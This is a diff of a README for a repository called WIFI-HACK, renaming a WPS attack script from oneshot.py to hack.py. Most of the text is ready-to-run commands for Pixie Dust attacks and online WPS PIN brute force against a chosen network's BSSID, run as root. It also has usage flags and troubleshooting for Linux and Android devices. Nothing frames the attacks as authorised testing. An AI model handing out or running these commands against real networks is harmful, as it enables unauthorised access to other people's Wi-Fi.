@@ -18,7 +18,7 @@ cd WIFI-HACK
 ls
 ```
 ```
-chmod +x oneshot.py
+chmod +x hack.py
 ```
 ```
 ls
@@ -33,7 +33,7 @@ cd WIFI-HACK
 ls
 ```
 ```
-sudo python oneshot.py -i wlan0 -K
+sudo python hack.py -i wlan0 -K
 ```
 
 ## [Brute Force]
@@ -44,7 +44,7 @@ cd WIFI-HACK
 ls
 ```
 ```
-sudo python oneshot.py -i wlan0 -K
+sudo python hack.py -i wlan0 -K
 ```
 Now we will copy the BSSID, which will look a bit like a MAC address. Example: B4:0F:3B:57:F0:90 -B
 
@@ -55,7 +55,7 @@ Then we will move to the home directory with the ```cd``` command.
 cd WIFI-HACK
 ```
 ```
-sudo python oneshot.py -i wlan0 -b (BSSID) -B
+sudo python hack.py -i wlan0 -b (BSSID) -B
 ```
 
 ## [What is needed]
@@ -68,7 +68,7 @@ When giving the last command, you need to turn off WiFi and data connection and 
 
 # Usage
 ```
- oneshot.py <arguments>
+ hack.py <arguments>
  Required arguments:
      -i, --interface=<wlan0>  : Name of the interface to use
 
@@ -96,25 +96,25 @@ When giving the last command, you need to turn off WiFi and data connection and 
 ## Usage examples
 Start Pixie Dust attack on a specified BSSID:
  ```
- sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+ sudo python3 hack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
  ```
 Show avaliable networks and start Pixie Dust attack on a specified network:
  ```
- sudo python3 oneshot.py -i wlan0 -K
+ sudo python3 hack.py -i wlan0 -K
  ```
 Launch online WPS bruteforce with the specified first half of the PIN:
  ```
- sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+ sudo python3 hack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
  ```
  Start WPS push button connection:s
  ```
- sudo python3 oneshot.py -i wlan0 --pbc
+ sudo python3 hack.py -i wlan0 --pbc
  ```
 ## Troubleshooting
 #### "RTNETLINK answers: Operation not possible due to RF-kill"
  Just run:
 ```sudo rfkill unblock wifi```
 #### "Device or resource busy (-16)"
- Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
+ Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running hack with ```--iface-down``` argument.
 #### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
- Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
+ Try running hack with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
